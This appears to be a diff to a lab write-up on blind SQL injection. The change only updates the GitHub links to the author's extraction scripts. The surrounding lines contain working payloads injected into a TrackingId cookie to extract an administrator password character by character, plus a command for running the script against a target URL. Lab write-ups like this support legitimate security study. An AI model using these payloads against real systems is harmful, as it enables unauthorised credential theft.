@@ -72,7 +72,7 @@ TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE user
 > TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,`$1-20$`,1)) FROM users WHERE username='administrator')=`$ASCII_numbers$`--
 - You can do that by using an intruder in the burp suite but it will take a long time to finish.
 - We can write a python script to extract the password automatically and quickly.
-- You can see my script from here:[SQLi_lab11_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab11_password_admin.py)
+- You can see my script from here:[SQLi_lab11_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab11_admin_password.py)
 - To run the script:
 ```
 $ python3 SQLi_lab11_password_admin.py "Target_URl"
@@ -154,7 +154,7 @@ TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,1,1))=111 THEN TO_CHAR(
 >ASCII(SUBSTR(password,`$1-20$`,1))=`$ASCII_numbers$`
 - You can do that by using an intruder in the burp suite but it will take a long time to finish.
 - We can write a python script to extract the password automatically and quickly.
-- You can see my script from here:[SQLi_lab12_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab12_password_admin.py)
+- You can see my script from here:[SQLi_lab12_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab12_admin_password.py)
 - To run the script:
 ```
 $ python3 SQLi_lab12_password_admin.py "Target_URl"
